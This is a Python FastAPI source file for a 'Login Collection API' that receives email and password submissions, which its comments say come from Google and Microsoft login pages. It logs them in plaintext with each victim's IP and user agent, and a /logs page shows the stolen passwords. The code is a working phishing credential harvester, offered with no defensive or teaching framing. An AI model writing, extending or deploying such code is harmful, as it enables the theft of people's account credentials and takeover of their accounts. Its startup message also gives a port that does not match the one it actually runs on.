from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse
import uvicorn
from datetime import datetime
import json
import os

app = FastAPI(title="Login Collection API", description="API to collect login credentials")

# Create logs directory if it doesn't exist
os.makedirs("logs", exist_ok=True)

@app.get("/", response_class=HTMLResponse)
async def root():
    """Root endpoint showing API status"""
    return """
    <html>
        <head>
            <title>Login Collection API</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .container { max-width: 800px; margin: 0 auto; }
                .status { color: green; font-weight: bold; }
                .endpoint { background: #f5f5f5; padding: 10px; margin: 10px 0; border-radius: 5px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Login Collection API</h1>
                <p class="status">✅ API is running successfully</p>
                <h2>Available Endpoints:</h2>
                <div class="endpoint">
                    <strong>POST /login</strong> - Collect login credentials
                </div>
                <div class="endpoint">
                    <strong>GET /logs</strong> - View collected login data
                </div>
                <div class="endpoint">
                    <strong>GET /docs</strong> - API documentation
                </div>
            </div>
        </body>
    </html>
    """

@app.post("/login")
async def collect_login(email: str = Form(...), password: str = Form(...), request: Request = None):
    """
    Collect login credentials from Google and Microsoft login pages
    """
    # Get client information
    client_ip = request.client.host if request and request.client else "Unknown"
    user_agent = request.headers.get("user-agent", "Unknown") if request else "Unknown"
    timestamp = datetime.now().isoformat()
    
    # Create login entry
    login_data = {
        "timestamp": timestamp,
        "email": email,
        "password": password,
        "client_ip": client_ip,
        "user_agent": user_agent,
        "source": "login_form"
    }
    
    # Save to JSON file
    log_file = f"logs/logins_{datetime.now().strftime('%Y-%m-%d')}.json"
    
    try:
        # Load existing logs
        if os.path.exists(log_file):
            with open(log_file, 'r', encoding='utf-8') as f:
                logs = json.load(f)
        else:
            logs = []
        
        # Add new login entry
        logs.append(login_data)
        
        # Save updated logs
        with open(log_file, 'w', encoding='utf-8') as f:
            json.dump(logs, f, indent=2, ensure_ascii=False)
        
        print(f"✅ Login collected: {email} from {client_ip}")
        
        # Return success response (this will be ignored by the frontend)
        return {"status": "success", "message": "Login processed"}
        
    except Exception as e:
        print(f"❌ Error saving login data: {e}")
        return {"status": "error", "message": "Failed to process login"}

@app.get("/logs")
async def view_logs():
    """
    View collected login data
    """
    try:
        # Get today's log file
        today = datetime.now().strftime('%Y-%m-%d')
        log_file = f"logs/logins_{today}.json"
        
        if os.path.exists(log_file):
            with open(log_file, 'r', encoding='utf-8') as f:
                logs = json.load(f)
            
            # Create HTML response
            html_content = f"""
            <html>
                <head>
                    <title>Login Logs - {today}</title>
                    <style>
                        body {{ font-family: Arial, sans-serif; margin: 20px; }}
                        .container {{ max-width: 1200px; margin: 0 auto; }}
                        .header {{ background: #f0f0f0; padding: 20px; border-radius: 5px; margin-bottom: 20px; }}
                        .log-entry {{ 
                            background: #f9f9f9; 
                            border: 1px solid #ddd; 
                            border-radius: 5px; 
                            padding: 15px; 
                            margin: 10px 0; 
                        }}
                        .timestamp {{ color: #666; font-size: 12px; }}
                        .email {{ font-weight: bold; color: #333; }}
                        .password {{ color: #d32f2f; font-family: monospace; }}
                        .client-info {{ color: #666; font-size: 12px; margin-top: 5px; }}
                        .count {{ background: #4caf50; color: white; padding: 5px 10px; border-radius: 3px; }}
                    </style>
                </head>
                <body>
                    <div class="container">
                        <div class="header">
                            <h1>Login Collection Logs</h1>
                            <p>Date: {today}</p>
                            <p>Total entries: <span class="count">{len(logs)}</span></p>
                        </div>
            """
            
            # Add each log entry
            for i, log in enumerate(reversed(logs), 1):  # Show newest first
                html_content += f"""
                        <div class="log-entry">
                            <div class="timestamp">Entry #{i} - {log['timestamp']}</div>
                            <div class="email">Email: {log['email']}</div>
                            <div class="password">Password: {log['password']}</div>
                            <div class="client-info">
                                IP: {log['client_ip']} | 
                                User-Agent: {log['user_agent'][:100]}{'...' if len(log['user_agent']) > 100 else ''}
                            </div>
                        </div>
                """
            
            html_content += """
                    </div>
                </body>
            </html>
            """
            
            return HTMLResponse(content=html_content)
        else:
            return HTMLResponse(content="""
                <html>
                    <head><title>No Logs Found</title></head>
                    <body>
                        <h1>No logs found for today</h1>
                        <p>No login data has been collected yet.</p>
                    </body>
                </html>
            """)
            
    except Exception as e:
        return HTMLResponse(content=f"""
            <html>
                <head><title>Error</title></head>
                <body>
                    <h1>Error loading logs</h1>
                    <p>Error: {str(e)}</p>
                </body>
            </html>
        """)

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {"status": "healthy", "timestamp": datetime.now().isoformat()}

if __name__ == "__main__":
    print("🚀 Starting Login Collection API...")
    print("📝 API will collect login data from Google and Microsoft login pages")
    print("📁 Logs will be saved to the 'logs' directory")
    print("🌐 Access the API at: http://localhost:8000")
    print("📖 View API docs at: http://localhost:8000/docs")
    print("📊 View collected logs at: http://localhost:8000/logs")
    
    uvicorn.run(
        "login_api:app",
        host="127.0.0.1",
        port=7777,
        reload=True,
        log_level="info"
    ) 